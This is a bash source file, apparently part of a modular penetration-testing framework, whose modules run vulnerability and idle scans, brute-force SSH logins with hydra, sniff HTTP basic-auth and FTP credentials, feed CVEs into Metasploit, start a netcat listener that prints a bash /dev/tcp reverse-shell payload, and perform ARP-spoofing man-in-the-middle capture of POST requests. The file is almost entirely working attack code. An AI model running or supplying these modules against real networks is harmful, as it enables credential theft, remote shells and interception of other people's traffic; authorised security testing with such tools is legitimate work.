#!/usr/bin/env bash

# ==============================================================================
#  VULNERABILITY & EXPLOITATION MODULES
# ==============================================================================

# Exploit Modules Options

# Options for mod_vuln
declare -gA MOD_OPTIONS_EXPLOIT_VULN
MOD_OPTIONS_EXPLOIT_VULN[TARGET]="description='Target IP, CIDR, or \"all\" to use the target list' required=true"

# Options for mod_brute
declare -gA MOD_OPTIONS_EXPLOIT_BRUTE
MOD_OPTIONS_EXPLOIT_BRUTE[TARGET]="description='Target IP or \"all\"' required=true"
MOD_OPTIONS_EXPLOIT_BRUTE[USER_FILE]="description='Path to username wordlist' required=false default='u.lst'"
MOD_OPTIONS_EXPLOIT_BRUTE[PASS_FILE]="description='Path to password wordlist' required=false default='p.lst'"
MOD_OPTIONS_EXPLOIT_BRUTE[SERVICE]="description='Service to brute force (e.g., ssh)' required=false default='ssh'"

# Options for mod_listener
declare -gA MOD_OPTIONS_EXPLOIT_LISTENER
MOD_OPTIONS_EXPLOIT_LISTENER[PORT]="description='Listening port' required=false default='4444'"

# Options for mod_intercept
declare -gA MOD_OPTIONS_EXPLOIT_INTERCEPT
MOD_OPTIONS_EXPLOIT_INTERCEPT[TARGET]="description='Target IP for MITM (does not support \"all\")' required=true"


# [6] VULN HUNTER
mod_vuln() {
    local target="${MODULE_OPTIONS[TARGET]}"

    if [[ -z "$target" ]]; then
        log_error "Required option 'TARGET' not set. Use 'set TARGET <ip/cidr/all>'."
        return
    fi

    local targets_param=""
    if [[ "$target" == "all" ]]; then
        if [[ ${#TARGETS[@]} -eq 0 ]]; then
            log_error "TARGET is set to 'all' but the target list is empty. Use 'add target <ip>'."
            return
        fi
        log_info "Scanning all targets in the target list..."
        # Create a temporary file with all targets
        for t in "${TARGETS[@]}"; do
            echo "$t" >> "$TMP_TARGETS"
        done
        targets_param="-iL $TMP_TARGETS"
    else
        validate_ip "$target" || { log_error "Invalid IP for TARGET option."; return; }
        targets_param="$target"
    fi

    log_success "Starting vulnerability scan. This may take a while..."
    
    # Export DB_FILE for the parser to use
    export DB_FILE

    # Run nmap and pipe to the parser
    nmap -F -T4 -n --open --script=vulners -oX - "$targets_param" | python3 "$INSTALL_DIR/parsers/nmap_vuln_parser.py"

    log_info "Vulnerability scan complete. Data stored in database."
}

# [2] ZOMBIE HUNTER
mod_zombie() {
    get_interface
    local subnet; subnet=$(echo "$MY_IP" | cut -d'.' -f1-3)
    log_info "Scanning $subnet.0/24 for zombie hosts..."
    local raw; raw=$(nmap -n -T4 -p80,443 --script=ipidseq "$subnet.1-254" 2>/dev/null)
    local cands; cands=$(echo "$raw" | awk '/Nmap scan report/{ip=$NF; gsub(/[()]/, "", ip)} /ipidseq: Incremental|Broken little-endian/{print ip}')
    
    if [[ -z "$cands" ]]; then
        log_info "No Zombies found."
        return
    fi

    log_info "Found possible zombie hosts: $cands"
    # The original script asked for user to select IP, this will be handled by TARGET option in the new design.
    # For now, we will just save the scan.
    sudo nmap -Pn -sI "$(echo "$cands" | head -n1)" "$subnet.0/24" | sudo tee "$LOG_DIR/zombie_scan.txt"
    log_success "Zombie scan saved to $LOG_DIR/zombie_scan.txt."
}

# [11] BRUTE FORCE
mod_brute() {
    local target="${MODULE_OPTIONS[TARGET]}"
    local user_file="${MODULE_OPTIONS[USER_FILE]}"
    local pass_file="${MODULE_OPTIONS[PASS_FILE]}"
    local service="${MODULE_OPTIONS[SERVICE]}"

    if [[ -z "$target" ]]; then
        log_error "Required option 'TARGET' not set. Use 'set TARGET <ip/all>'."
        return
    fi
    if [[ -z "$user_file" ]]; then
        log_error "Required option 'USER_FILE' not set. Use 'set USER_FILE <path>'."
        return
    fi
    if [[ -z "$pass_file" ]]; then
        log_error "Required option 'PASS_FILE' not set. Use 'set PASS_FILE <path>'."
        return
    fi
    if [[ -z "$service" ]]; then
        log_error "Required option 'SERVICE' not set. Use 'set SERVICE <service>'."
        return
    fi

    local targets_to_scan=()
    if [[ "$target" == "all" ]]; then
        if [[ ${#TARGETS[@]} -eq 0 ]]; then
            log_error "TARGET is set to 'all' but the target list is empty. Use 'add target <ip>'."
            return
        fi
        log_info "Scanning all targets in the target list..."
        for t in "${TARGETS[@]}"; do
            targets_to_scan+=("$t")
        done
    else
        validate_ip "$target" || { log_error "Invalid IP for TARGET option."; return; }
        targets_to_scan+=("$target")
    fi

    # The original script created these files on the fly.
    # We should expect them to exist or provide defaults.
    # For now, I'll keep the direct file creation.
    echo "admin" > u.lst
    echo "password" > p.lst

    for t in "${targets_to_scan[@]}"; do
        log_info "Brute-forcing $service on $t with userlist $user_file and passlist $pass_file..."
        hydra -L "$user_file" -P "$pass_file" "$service://$t"
    done
    
    rm u.lst p.lst
    log_info "Brute force complete."
}

# [12] SNIFFER
mod_sniff() {
    # This module doesn't currently take options from MODULE_OPTIONS.
    # It relies on DEFAULT_IFACE.
    get_interface
    log_info "Sniffing Auth on $DEFAULT_IFACE..."
    sudo tshark -i "$DEFAULT_IFACE" -Y "http.auth.basic || ftp.request.command == \"USER\"" -T fields -e ip.src -e http.auth.basic -e ftp.request.arg
    log_info "Sniffing complete."
}

# [9] MSF BRIDGE
mod_msf() {
    # This module doesn't currently take options from MODULE_OPTIONS.
    # It relies on existing XML reports.
    if ! type -p msfconsole &>/dev/null && [[ ! -x "/opt/metasploit-framework/bin/msfconsole" ]]; then
        log_error "Install Metasploit first."
        return
    fi
    if command -v systemctl &>/dev/null;
        then
        sudo systemctl start postgresql 2>/dev/null
    else
        sudo service postgresql start 2>/dev/null
    fi

    local xml; xml=$(find "$LOG_DIR" -maxdepth 1 -name "vuln_report_*.xml" -printf '%T@ %p\n' 2>/dev/null | sort -nr | head -n 1 | awk '{print $2}')
    if [[ -z "$xml" ]]; then
        log_error "No XML reports found to import into MSF."
        return
    fi
    log_info "Loading $(basename "$xml") into Metasploit..."
    local rc="ionscan_setup.rc"
    local cves; cves=$(grep -o "CVE-[0-9]\\{4\\}-[0-9]\\{4,\}" "$xml" | sort | uniq)
    { echo "workspace -a ionscan"; echo "db_import $xml"; for c in $cves; do echo "search $c"; done; } > "$rc"

    if type -p msfconsole &>/dev/null; then sudo msfconsole -r "$rc"; else sudo /opt/metasploit-framework/bin/msfconsole -r "$rc"; fi
    rm "$rc"
    log_info "Metasploit session complete."
}

# [14] SHELL LISTENER
mod_listener() {
    local port="${MODULE_OPTIONS[PORT]}"
    
    if [[ -z "$port" ]]; then
        log_error "Required option 'PORT' not set. Use 'set PORT <port>'."
        return
    fi

    log_info "Payload: bash -i >& /dev/tcp/$MY_IP/$port 0>&1"
    log_success "Listening on port $port for incoming shell..."
    nc -lvnp "$port"
    log_info "Listener stopped."
}

# [16] INTERCEPTOR
mod_intercept() {
    local target="${MODULE_OPTIONS[TARGET]}"

    if [[ -z "$target" ]]; then
        log_error "Required option 'TARGET' not set. Use 'set TARGET <ip>'."
        return
    fi
    if [[ "$target" == "all" ]]; then
        log_error "Module 'intercept' does not support 'all' as a target."
        return
    fi

    get_interface; local gw; gw=$(ip route | grep default | awk '{print $3}' | head -n1)
    if [[ -z "$gw" ]]; then log_error "No gateway found. Cannot perform MITM."; return; fi

    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i "$DEFAULT_IFACE" -t "$target" "$gw" >/dev/null 2>&1 & SPOOF_PID1=$!
    arpspoof -i "$DEFAULT_IFACE" -t "$gw" "$target" >/dev/null 2>&1 & SPOOF_PID2=$!
    log_warning "MITM Active. Sniffing traffic between $target and $gw..."
    log_info "To stop sniffing, press CTRL+C multiple times."
    tshark -i "$DEFAULT_IFACE" -Y "http.request.method == POST"
    cleanup # Ensures IP forwarding is reset and arpspoof processes are killed
    log_info "Interceptor stopped."
}
